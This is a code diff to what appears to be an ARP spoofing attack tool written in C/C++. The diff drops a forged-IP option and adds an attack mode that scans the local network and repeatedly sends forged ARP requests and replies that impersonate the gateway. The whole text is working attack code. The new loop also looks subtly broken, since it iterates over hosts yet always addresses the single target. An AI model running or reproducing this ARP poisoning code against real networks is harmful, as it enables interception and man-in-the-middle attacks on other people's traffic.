@@ -73,7 +73,6 @@ static void usage() {
     fprintf(stdout, "    -scan          : scan inner host\n");
     fprintf(stdout, "    [-gwip ip]     : specify gateway ip\n");
     fprintf(stdout, "    [-gwmac mac]   : specify gateway mac\n");
-    fprintf(stdout, "    [-fgip ip]     : specify forged ip\n");
     fprintf(stdout, "    [-fgmac mac]   : specify forged mac\n");
     fprintf(stdout, "    -target ip     : target ip\n");
     fprintf(stdout, "    -h             : help\n");
@@ -175,7 +174,6 @@ int main(int argc, const char *argv[]) {
     const char* gw_ip = NULL;
     uint8_t gw_mac[ETH_ALEN] = {0};
     bool has_gw_mac = false;
-    const char* forged_ip = NULL;
     uint8_t forged_mac[ETH_ALEN] = {0};
     bool has_fg_mac = false;
     int att_type = 0;
@@ -218,18 +216,6 @@ int main(int argc, const char *argv[]) {
                 has_gw_mac = true;
             } else {
                 fprintf(stderr, "-gwmac need mac address.\n");
-                return -1;
-            }
-        } else if (strncasecmp(argv[i], "-fgip", 5) == 0) {
-            i++;
-            if (i < argc) {
-                if (0 != check_ip(argv[i])) {
-                    fprintf(stderr, "forged ip invalid!\n");
-                    return -1;
-                }
-                forged_ip = argv[i];
-            } else {
-                fprintf(stderr, "-fgip need ip address.\n");
                 return -1;
             }
         } else if (strncasecmp(argv[i], "-fgmac", 6) == 0) {
@@ -313,11 +299,11 @@ int main(int argc, const char *argv[]) {
             return -1;
         }
         while (run) {
-            uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
-            req_arpbuf.op = 1;
+            //uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
             //memcpy(req_arpbuf.eth_dst_mac, broad, ETH_ALEN);
             //bzero(req_arpbuf.arp_tgt_mac, ETH_ALEN);
 //
+            req_arpbuf.op = 1;
             if (has_gw_mac) {
                 memcpy(rsp_arpbuf.eth_dst_mac, gw_mac, ETH_ALEN);
                 memcpy(rsp_arpbuf.arp_tgt_mac, gw_mac, ETH_ALEN);
@@ -358,10 +344,10 @@ int main(int argc, const char *argv[]) {
     } else if (att_type == 1) {
         while (run) {
             // send request packet
-            uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
-            req_arpbuf.op = 1;
+            //uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
             //memcpy(req_arpbuf.eth_dst_mac, broad, ETH_ALEN);
             //bzero(req_arpbuf.arp_tgt_mac, ETH_ALEN);
+            req_arpbuf.op = 1;
 //
             memcpy(req_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
             memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
@@ -399,6 +385,53 @@ int main(int argc, const char *argv[]) {
         fprintf(stdout, "\n");
     } else if (att_type == 2) {
         scan_host(ifname);
+        while (run) {
+            for (iter = ips.begin(); iter != ips.end(); iter++) {
+                if (iter->first == target_ip) {
+                    continue;
+                }
+                // send request packet
+                //uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
+                //memcpy(req_arpbuf.eth_dst_mac, broad, ETH_ALEN);
+                //bzero(req_arpbuf.arp_tgt_mac, ETH_ALEN);
+                req_arpbuf.op = 1;
+//
+                memcpy(req_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
+                memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
+//
+                req_arpbuf.arp_snd_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
+                req_arpbuf.arp_tgt_ip = target_ip;
+                if (has_gw_mac) {
+                    memcpy(rsp_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
+                    memcpy(rsp_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
+                } else {
+                    get_mac_addr(rand_mac.c_str(), req_arpbuf.eth_src_mac,
+                            ETH_ALEN);
+                    memcpy(req_arpbuf.arp_snd_mac, req_arpbuf.eth_src_mac, ETH_ALEN);
+                }
+                send_arp_packet(&req_arpbuf);
+                // send response packet
+                rsp_arpbuf.op = 2;
+                memcpy(rsp_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
+                memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
+                rsp_arpbuf.arp_snd_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
+                rsp_arpbuf.arp_tgt_ip = target_ip;
+                if (has_gw_mac) {
+                    memcpy(rsp_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
+                    memcpy(rsp_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
+                } else {
+                    get_mac_addr(rand_mac.c_str(), rsp_arpbuf.eth_src_mac,
+                            ETH_ALEN);
+                    memcpy(rsp_arpbuf.arp_snd_mac, rsp_arpbuf.eth_src_mac, ETH_ALEN);
+                }
+                send_arp_packet(&rsp_arpbuf);
+                usleep(500000);
+                fprintf(stdout, ".");
+                fflush(stdout);
+            }
+            fprintf(stdout, "\n");
+
+        }
     } else {
         fprintf(stderr, "unknown attack type, [%d]\n", att_type);
         return -1;
